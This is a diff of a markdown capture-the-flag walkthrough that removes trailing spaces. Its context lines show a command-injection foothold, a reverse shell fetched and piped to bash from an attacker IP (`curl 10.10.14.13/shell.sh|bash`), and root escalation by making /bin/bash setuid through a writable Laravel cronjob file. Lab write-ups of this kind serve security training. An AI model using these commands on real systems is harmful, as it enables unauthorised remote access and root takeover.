@@ -67,7 +67,7 @@ This is obviously vulnerable to command injection, which we can find quite easil
 
 <figure><img src="../../../.gitbook/assets/image (1961).png" alt=""><figcaption></figcaption></figure>
 
-We can then get a reverse shell using `curl 10.10.14.13/shell.sh|bash`.&#x20;
+We can then get a reverse shell using `curl 10.10.14.13/shell.sh|bash`.
 
 <figure><img src="../../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>
 
@@ -100,7 +100,7 @@ drwxr-xr-x 23 root   root   4096 May 10  2022 ..
 drwxr-xr-x  4 noulis noulis 4096 May 10  2022 noulis
 ```
 
-We can easily grab the user flag from this.&#x20;
+We can easily grab the user flag from this.
 
 ### Laravel Cronjob
 
@@ -114,6 +114,6 @@ The `root` user was running a PHP file called `artisan` that we had write access
 exec("chmod u+s /bin/bash");
 ```
 
-Wait for a little bit, and the script should execute. We can then easily get a `root` shell.&#x20;
+Wait for a little bit, and the script should execute. We can then easily get a `root` shell.
 
 <figure><img src="../../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
